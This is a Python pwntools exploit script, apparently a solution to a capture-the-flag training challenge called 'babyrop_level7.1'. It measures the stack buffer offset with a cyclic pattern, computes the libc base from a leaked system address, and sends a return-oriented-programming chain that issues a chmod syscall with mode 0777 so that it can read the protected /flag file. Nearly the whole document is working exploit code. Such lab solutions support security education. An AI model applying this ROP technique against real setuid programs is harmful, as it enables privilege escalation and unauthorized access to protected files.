#!usr/bin/python3
from pwn import *

# Setup the machine architecture
context.arch = "amd64"

# Retrieve the ELF information from the binary
elf = ELF("/challenge/babyrop_level7.1")

# Run the program
io = elf.process(setuid=False)

# Build and send the payload to the program
# NOTE: cyclic function setup a pattern payload that with
#       cyclic_find can be used to retrieve the distance
#       between buffer and return address
io.sendline(cyclic(512, n=8))
io.wait()
buffer_length = cyclic_find(io.corefile.fault_addr, n=8)

# Run the program another time
io = elf.process()

# Retrieve the address of the library function "system"
io.recvuntil(b'is: 0x')
system_addr = int(io.recvuntil(b'.').decode()[:-1], 16) 

# Retrieve the ELF information from the libc binary
libc = ELF(io.libc.path)

# Compute the libc address by system_address - func_offset
system_offset = libc.symbols.system
libc.address = system_addr - system_offset

# Compute the current gadget addresses by adding the libc address to their offsets
# NOTE: The added values are obtained from:
#       ROPgadget --binary <path_to_libc> | grep <assembly_op>
SYSCALL = libc.address + 0x02284d
POP_RAX = libc.address + 0x036174
POP_RDI = libc.address + 0x023b6a
POP_RSI = libc.address + 0x02601f

# Build and send the payload to the program
# The rop chain:
# - Setup the rax register with the "chmod" system call number
# - Setup the rdi register with the name of the file (1st parameter)
# - Setup the rsi register with the flags to set (2nd parameter)
# - Execute syscall
PAYLOAD = b'A'*buffer_length +\
    p64(POP_RAX) + p64(0x5A) +\
    p64(POP_RDI) + p64(next(elf.search(b'main\x00'))) +\
    p64(POP_RSI) + p64(0o777) +\
    p64(SYSCALL)
io.sendline(PAYLOAD)

# Make the program interactive via console
io.interactive()

# Once we have executed the chmod system call we try 
# to open and read the "/flag" file
with open("/flag") as f:
    print(next(f))